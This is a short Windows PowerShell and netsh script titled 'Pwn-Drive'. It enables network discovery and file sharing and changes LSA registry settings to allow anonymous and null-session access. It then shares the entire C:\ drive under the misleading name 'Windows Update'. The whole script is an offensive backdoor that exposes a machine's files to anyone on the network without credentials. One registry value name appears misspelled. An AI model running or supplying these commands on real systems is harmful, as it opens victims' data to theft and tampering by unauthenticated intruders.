#Pwn-Drive

#Enable Network Discovery
netsh advfirewall firewall set rule group=”network discovery” new enable=yes

#Enable File and Print
netsh firewall set service type=fileandprint mode=enable profile=all

#Setting Registry Values for allowing access to drive without credentials
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name everyoneincludesanonymous -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\" -Name restrictnullsessacces -Value 0 -Force

#Sharing the Drive
New-SmbShare -Name "Windows Update" -Path "C:\"